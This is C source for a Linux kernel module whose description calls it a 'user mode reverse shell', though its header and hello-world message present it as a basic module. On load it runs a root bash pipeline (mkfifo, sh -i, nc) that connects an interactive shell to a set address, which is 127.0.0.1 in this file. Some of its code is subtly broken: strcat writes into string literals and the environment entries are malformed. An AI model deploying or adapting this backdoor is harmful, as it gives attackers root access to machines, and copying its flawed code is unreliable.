/*
* main.c - basic kernel module
*/
#include <linux/module.h>  // Needed by all kernel modules
#include <linux/kernel.h>  // Needed for KERN_INFO
#include <linux/init.h>    // Needed for macros
#include <linux/kmod.h>
#include <linux/moduleparam.h>
#include <linux/stat.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("CyberName");
MODULE_DESCRIPTION("User mode reverse shell");
MODULE_VERSION("0.1");

void start_reverse_shell(char *ip, char *port) {
	char *envp[] = {
		"HOME=/root",
		"TERM=xterm",
		strcat("IP_ADDR", ip),
		strcat("PORT_ADDR", port),
		NULL
	};

	char *argv[] = {
		"/bin/bash",
		"-c",
		"/usr/bin/rm /tmp/pinkit;/usr/bin/mkfifo /tmp/pinkit;/usr/bin/cat /tmp/pinkit|/bin/sh -i 2>&1|/usr/bin/nc $IP_ADDR $PORT_ADDR >/tmp/pinkit",
		NULL
	};

	printk("Start reverse shell...\n");
	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
	printk("Reverse shell created.\n");
}


static int __init start_module(void) {
	printk(KERN_INFO "Hello world! test1\n");
	start_reverse_shell("127.0.0.1", "1234");
	return 0;
}

static void __exit stop_module(void) {
	printk(KERN_INFO "Goodbye world 1.\n");
}

module_init(start_module);
module_exit(stop_module);